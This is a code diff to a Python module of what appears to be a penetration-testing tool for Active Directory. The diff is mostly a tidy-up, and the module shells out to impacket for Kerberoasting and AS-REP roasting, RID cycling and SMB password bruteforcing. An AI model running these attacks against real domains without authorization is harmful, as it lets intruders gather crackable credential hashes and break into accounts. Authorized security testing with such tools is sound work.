@@ -1,7 +1,8 @@
-from mods.mod_utils import *
-from mods.mod_smb import *
+from mods.mod_utils import print_banner, printc, log, print_separator, GREEN, BLUE, RED
+from mods.mod_smb import bruteforce, rid_cycling, export_wordlists, smb_passwords
 import subprocess
 import os
+import re
 
 
 def enum_users(target, domain):
@@ -77,6 +78,8 @@ def check_kerberoast(target, domain, user='Guest', passw=''):
     if (user == 'Guest'):
         cmd = f'impacket-GetUserSPNs {domain}/jhon.doe -no-pass -dc-ip {target} -stealth -request -output tickets.txt'
 
+    output = None
+    output = None
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
     except Exception as e:
@@ -92,7 +95,7 @@ def check_kerberoast(target, domain, user='Guest', passw=''):
                 passw_last_set = re.findall(r'....-..-..\s.*:.*:.*\.', line)
                 if passw_last_set:
                     re_user = re.findall(r'.+\s(\w+)\s', line)
-                    if re_user: 
+                    if re_user:
                         kerberoastable_user = re_user[0]
                         printc(f'[+] {kerberoastable_user}', BLUE)
             log(output, cmd, target, 'impacket-GetUserSPNs')
@@ -110,7 +113,7 @@ def check_kerberoast(target, domain, user='Guest', passw=''):
             if ('KRB_AP_ERR_SKEW' in output):
                 printc('[-] Requesting tickets failed.', RED)
                 print('[!] Trying to Synchronize TIME with server.')
-                time_cmd = f'sntp -sS {target}' 
+                time_cmd = f'sntp -sS {target}'
                 print(f'[!] {time_cmd}')
                 output = subprocess.check_output(time_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
 
@@ -162,12 +165,14 @@ def check_smb_credentials(target, domain):
 def check_asreproast(target, domain, user='Guest', passw=''):
     # NULL
     filename = 'smb_users.txt'
-    if not (os.path.exists(filename)): return
-    if (user == 'Guest'):        
+    if not (os.path.exists(filename)):
+        return
+    if (user == 'Guest'):
         cmd = f'impacket-GetNPUsers -no-pass {domain}/guest -dc-ip {target} -usersfile {filename} -output tickets.txt'
     # Creds
     cmd = f'impacket-GetNPUsers {domain}/{user}:{passw} -dc-ip {target} -usersfile {filename} -output tickets.txt'
-    
+
+    output = None
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
     except Exception as e:
@@ -205,7 +210,8 @@ def bruteforce_kerberos_users(target, domain):
 def handle_kerberos(target, domain):
     #printc('kerberos', RED)
 
-    if (len(domain) < 3): return
+    if (len(domain) < 3):
+        return
     rid_cycling(target=target, domain=domain)
     if os.path.exists('smb_users.txt'):
         bruteforce(target, 445)
